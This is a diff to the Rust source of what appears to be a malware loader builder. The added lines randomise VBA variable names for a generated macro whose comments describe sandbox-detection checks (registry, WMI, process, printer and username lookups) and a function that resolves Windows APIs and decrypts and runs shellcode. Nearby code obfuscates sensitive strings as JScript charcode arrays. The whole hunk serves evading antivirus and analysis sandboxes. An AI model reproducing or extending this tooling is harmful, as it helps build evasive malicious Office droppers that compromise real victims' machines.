@@ -261,6 +261,21 @@ fn build_context(config: &LoaderConfig) -> Context {
     for k in &["del_nt_alloc", "del_nt_prot", "del_nt_thread"] {
         vars.insert(k, rand_ident(8));
     }
+    // VBA local variable names in sandbox/exec functions — randomised per build
+    for k in &[
+        // fn_sandbox: registry + process + env checks
+        "vba_lv_xi", "vba_lv_vmcodes", "vba_lv_vbcodes", "vba_lv_shell",
+        "vba_lv_usr", "vba_lv_badu", "vba_lv_lcnt", "vba_lv_cname", "vba_lv_badc",
+        "vba_lv_fso", "vba_lv_drv",
+        "vba_lv_wmisvc", "vba_lv_prtq", "vba_lv_prtcnt", "vba_lv_oprt",
+        "vba_lv_wmiproc", "vba_lv_pq", "vba_lv_badproc", "vba_lv_op", "vba_lv_pn", "vba_lv_jcnt",
+        // fn_exec: API resolve + shellcode run
+        "vba_lv_k32", "vba_lv_u32", "vba_lv_gcpos", "vba_lv_pt1", "vba_lv_pt2", "vba_lv_tstart",
+        "vba_lv_schex", "vba_lv_keyhex", "vba_lv_k", "vba_lv_ki",
+        "vba_lv_raw", "vba_lv_sc", "vba_lv_mem", "vba_lv_oldp",
+    ] {
+        vars.insert(k, rand_ident(7));
+    }
 
     // JScript charcode arrays (comma-separated integers) for sensitive strings
     let jsc_pairs: &[(&str, &str)] = &[
